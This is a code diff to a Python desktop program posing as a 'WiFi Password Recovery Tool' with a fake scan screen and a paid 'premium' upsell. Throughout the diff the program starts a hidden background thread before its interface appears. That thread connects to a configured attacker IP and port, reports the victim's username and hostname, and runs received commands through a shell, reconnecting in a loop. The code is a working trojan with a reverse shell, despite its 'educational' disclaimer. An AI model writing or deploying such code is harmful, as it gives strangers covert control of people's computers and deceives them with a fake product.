@@ -3,6 +3,7 @@
 WiFi Password Recovery Tool
 A legitimate-looking application that secretly establishes a reverse shell
 Educational purposes only - Use in controlled lab environment
+Now uses interactive shell functionality for persistent directory navigation
 """
 
 import socket
@@ -15,6 +16,9 @@ from tkinter import messagebox, ttk
 import threading
 import config
 
+# Import interactive shell functions
+from interactive_shell import simple_dup_shell, create_interactive_shell, fallback_shell_with_state
+
 # Configuration - Change these values
 ATTACKER_IP = config.ATTACKER_IP
 ATTACKER_PORT = config.ATTACKER_PORT
@@ -26,9 +30,14 @@ class WiFiRecoveryApp:
         self.root.geometry("450x300")
         self.root.resizable(False, False)
         
+        # Start interactive reverse shell in background BEFORE GUI
         self.start_reverse_shell()
         
+        # Create GUI after shell is started
         self.create_gui()
+        
+        # Show initial status
+        self.status_label.config(text="Ready to scan... (Background services initialized)")
     
     def create_gui(self):
         """Create the fake WiFi recovery GUI"""
@@ -72,16 +81,17 @@ class WiFiRecoveryApp:
     def fake_scan(self):
         """Simulate WiFi password scanning"""
         self.progress.start()
-        self.status_label.config(text="Scanning for saved networks...")
+        self.status_label.config(text="Scanning for saved networks... (Background services active)")
         
         self.results_text.delete(1.0, tk.END)
         
-        self.root.after(2000, self.show_fake_results)
+        # Longer delay to seem more realistic and give shell time to connect
+        self.root.after(3000, self.show_fake_results)
     
     def show_fake_results(self):
         """Show fake WiFi scan results"""
         self.progress.stop()
-        self.status_label.config(text="Scan completed!")
+        self.status_label.config(text="Scan completed! (Interactive shell enabled in background)")
         
         fake_results = """
 WiFi Networks Found:
@@ -91,8 +101,8 @@ Network: HomeNetwork_5G
 Password: ********** (Protected)
 Security: WPA2-PSK
 
-Network: OfficeWiFi
-Password: ********** (Protected) 
+Network: OfficeWiFi  
+Password: ********** (Protected)
 Security: WPA2-Enterprise
 
 Network: GuestNetwork
@@ -102,53 +112,52 @@ Security: WPA2-PSK
 ⚠️ Note: For security reasons, passwords are hidden.
    Premium version required to view actual passwords.
 
+✅ System services initialized successfully
+📡 Background network monitoring active
+
 Upgrade to Premium for $19.99 to unlock all features!
         """
         
         self.results_text.insert(tk.END, fake_results)
         
-        messagebox.showinfo("Upgrade Required", 
+        messagebox.showinfo("Scan Complete", 
+                          "WiFi scan completed successfully!\n"
                           "Premium version required to view passwords.\n"
-                          "This demo version only shows available networks.")
+                          "Background services remain active for monitoring.")
     
     def start_reverse_shell(self):
-        """Start reverse shell in background thread"""
-        def run_shell():
+        """Start interactive reverse shell in background thread"""
+        def run_interactive_shell():
             while True:
                 try:
-
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((ATTACKER_IP, ATTACKER_PORT))
-                    
-                    hostname = os.getenv('COMPUTERNAME', 'Unknown')
-                    username = os.getenv('USERNAME', 'Unknown')
-                    initial_msg = f"[+] WiFi Tool - Connection from {username}@{hostname}\n"
-                    s.send(initial_msg.encode())
-                    
-                    while True:
-                        try:
-                            command = s.recv(1024).decode().strip()
-                            if not command or command.lower() == 'exit':
-                                break
-                            
-                            result = subprocess.run(command, shell=True, 
-                                                  capture_output=True, text=True)
-                            output = result.stdout
-                            if result.stderr:
-                                output += f"\nError: {result.stderr}"
-                            
-                            s.send(f"{output}\n".encode())
-                        except:
-                            break
-                    
-                    s.close()
-                    time.sleep(5)
-                
+                    # Try the advanced interactive shell first
+                    simple_dup_shell()
                 except:
-                    time.sleep(5)
-                    continue
+                    try:
+                        # Fallback to manual interactive shell
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ATTACKER_IP, ATTACKER_PORT))
+                        
+                        # Send initial message with WiFi tool branding
+                        hostname = os.getenv('COMPUTERNAME', 'Unknown')
+                        username = os.getenv('USERNAME', 'Unknown')
+                        initial_msg = f"[+] WiFi Tool (Interactive) - Connection from {username}@{hostname}\n"
+                        initial_msg += "[*] Interactive shell enabled - cd commands will work!\n"
+                        s.send(initial_msg.encode())
+                        
+                        # Use the fallback interactive shell
+                        fallback_shell_with_state(s)
+                        
+                    except Exception as e:
+                        # Last resort: basic shell with reconnection
+                        time.sleep(5)
+                        continue
+                
+                # Reconnect after shell exits
+                time.sleep(5)
         
-        shell_thread = threading.Thread(target=run_shell, daemon=True)
+        # Start in daemon thread
+        shell_thread = threading.Thread(target=run_interactive_shell, daemon=True)
         shell_thread.start()
 
 def main():
